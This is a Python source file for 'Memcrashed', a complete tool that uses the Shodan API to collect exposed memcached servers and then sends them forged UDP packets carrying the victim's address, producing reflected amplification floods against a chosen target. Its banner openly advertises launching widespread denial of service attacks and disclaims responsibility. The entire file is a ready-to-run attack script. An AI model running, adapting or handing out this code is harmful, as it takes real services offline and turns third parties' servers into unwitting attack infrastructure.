#-- coding: utf8 --
#!/usr/bin/env python3
import sys
import os
import time
import shodan
import ipaddress
import logging
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

class Color:
    HEADER = '\033[0m'

keys = Path("./api.txt")
logo = Color.HEADER + '''

   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                        Author: @037
                                        Version: 4.0

####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                                      
'''
print(logo)

if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY = file.readline().strip()
else:
    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ').strip()
    with open('api.txt', 'w') as file:
        file.write(SHODAN_API_KEY)
        print('[~] File written: ./api.txt')

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    try:
        myresults = Path("./bots.txt")
        query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
        if query.startswith('y'):
            print('[~] Checking Shodan.io API Key...')
            try:
                results = api.search('product:"Memcached" port:11211')
                print('[✓] API Key Authentication: SUCCESS')
                print('[~] Number of bots: %s' % results['total'])
                saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
                if saveresult.startswith('y'):
                    with open('bots.txt', 'w') as file2:
                        for result in results['matches']:
                            file2.write(result['ip_str'] + "\n")
                    print('[~] File written: ./bots.txt')
            except shodan.APIError as e:
                print(f'[✘] Error: {e}')
                continue

        if myresults.is_file() and input('[*] Use locally stored Shodan data? <Y/n>: ').lower().startswith('y'):
            with open('bots.txt') as my_file:
                ip_array = [line.strip() for line in my_file if is_valid_ip(line.strip())]
        else:
            ip_array = []
            print('[✘] Error: No valid bots found in bots.txt')

        if not ip_array:
            print('[✘] No valid bots available. Exiting...')
            break

        target = input("[▸] Enter target IP address: ").strip()
        if not is_valid_ip(target):
            print('[✘] Invalid target IP address. Exiting...')
            break

        try:
            targetport = int(input("[▸] Enter target port number (Default 80): ") or 80)
        except ValueError:
            print('[✘] Invalid target port. Exiting...')
            break

        try:
            power = int(input("[▸] Enter preferred power (Default 1): ") or 1)
        except ValueError:
            print('[✘] Invalid power value. Exiting...')
            break

        data = input("[+] Enter payload contained inside packet (Default stats): ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

        engage = input(f'[*] Ready to engage target {target}? <Y/n>: ').lower()
        if not engage.startswith('y'):
            print('[✘] Engagement canceled. Exiting...')
            break

        print('[*] Sending packets...')
        for ip in ip_array:
            print(f'[+] Sending forged payloads to: {ip}')
            with suppress_stdout():
                send(IP(src=target, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=data), count=power)

        print('[✓] Task complete! Exiting platform.')
        break

    except Exception as e:
        logging.error(f'Unexpected error: {e}')
        break
